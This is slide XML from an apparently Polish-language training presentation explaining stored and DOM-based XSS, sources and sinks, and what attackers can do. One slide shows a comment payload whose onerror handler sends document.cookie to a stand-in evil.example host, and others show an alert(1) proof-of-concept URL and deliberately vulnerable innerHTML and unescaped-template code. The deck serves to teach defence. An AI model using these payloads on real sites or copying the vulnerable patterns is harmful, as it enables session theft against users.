            <a:off x="6172200" y="3926384"/>
            <a:ext cx="2603119"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4561F"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Serwer wstawia parametr do HTML</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8851900" y="3926384"/>
            <a:ext cx="2603119"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4561F"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Skrypt wykonuje się w sesji ofiary</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2F6DB3"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>STORED XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="11378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Komentarz, który atakuje każdego czytelnika</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1889621"/>
            <a:ext cx="10566400" cy="1731963"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5866"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="15171C"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="2143621"/>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E8B84"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>// treść komentarza zapisana w bazie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="2468662"/>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8A4B"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>Świetny artykuł! &lt;img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="2793702"/>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E8B84"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>// szablon renderujący komentarze – bez kodowania</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="3118743"/>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&lt;div class="comment"&gt;{{{ comment.body }}}&lt;/div&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="3926384"/>
            <a:ext cx="5337048"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B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Nie potrzeba tagu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> – wystarczy dowolny atrybut zdarzenia: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>onerror</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>onload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>onfocus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>…</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6197600" y="3926384"/>
            <a:ext cx="5337048"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B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Typowe miejsca: komentarze, profile, nazwy plików, wiadomości, panele administracyjne czytające dane od użytkowników.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>DOM-BASED XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="11378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Źródło → sink, wszystko w przeglądarce</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1889621"/>
            <a:ext cx="10566400" cy="2057003"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4939"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="15171C"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="2143621"/>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E8B84"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>// kod frontendu</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="2468662"/>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const name = decodeURIComponent(location.hash.slice(1));</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="2793702"/>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document.getElementById('hello').innerHTML = 'Witaj, ' + name;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="3118743"/>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E8B84"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>// URL – fragment po # nie trafia do serwera</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="3443784"/>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8A4B"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>https://app.example/#&lt;img src=x onerror=alert(1)&gt;</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4264124"/>
          <a:ext cx="10553700" cy="827881"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="5276850">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="5276850">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="413941">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0">
                        <a:lnSpc>
                          <a:spcPts val="1960"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="4A4D55"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Źródła (sources)</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nSpc>
                          <a:spcPts val="1960"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="4A4D55"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Niebezpieczne sinki</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="76200" marB="7620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413941">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0">
                        <a:lnSpc>
                          <a:spcPts val="1960"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>location, document.referrer, postMessage, localStorage</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B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>innerHTML, document.write, eval, setTimeout(string)</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Co może zrobić atakujący</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1618555"/>
            <a:ext cx="3414117" cy="1636713"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6014"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E0DDD4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1073150" y="1875730"/>
            <a:ext cx="298676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Przejęcie sesji</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1073150" y="2226171"/>
            <a:ext cx="298676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D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Kradzież ciasteczek i tokenów, logowanie jako ofiara</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4388842" y="1618555"/>
            <a:ext cx="3414216" cy="1636713"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6014"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E0DDD4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4646017" y="1875730"/>
            <a:ext cx="298686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Akcje w imieniu ofiary</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4646017" y="2226171"/>
            <a:ext cx="298686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D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Przelewy, zmiana hasła lub e-maila, posty</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7961809" y="1618555"/>
            <a:ext cx="3414216" cy="1636713"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6014"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E0DDD4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8218984" y="1875730"/>
            <a:ext cx="2986862" cy="57388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Phishing w zaufanej domenie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8218984" y="2500412"/>
            <a:ext cx="298686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D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Fałszywy formularz logowania pod prawdziwym adresem</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="3414018"/>
            <a:ext cx="3414117" cy="1362472"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7224"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E0DDD4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1073150" y="3671193"/>
            <a:ext cx="298676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Keylogging</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1073150" y="4021634"/>
            <a:ext cx="298676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D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Przechwytywanie wszystkiego, co ofiara wpisze</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4388842" y="3414018"/>
            <a:ext cx="3414216" cy="1362472"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7224"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E0DDD4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4646017" y="3671193"/>
            <a:ext cx="298686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Kradzież danych</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4646017" y="4021634"/>
            <a:ext cx="315386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D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Odczyt treści stron i odpowiedzi API</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7961809" y="3414018"/>
            <a:ext cx="3414216" cy="1362472"/>
          </a:xfrm>
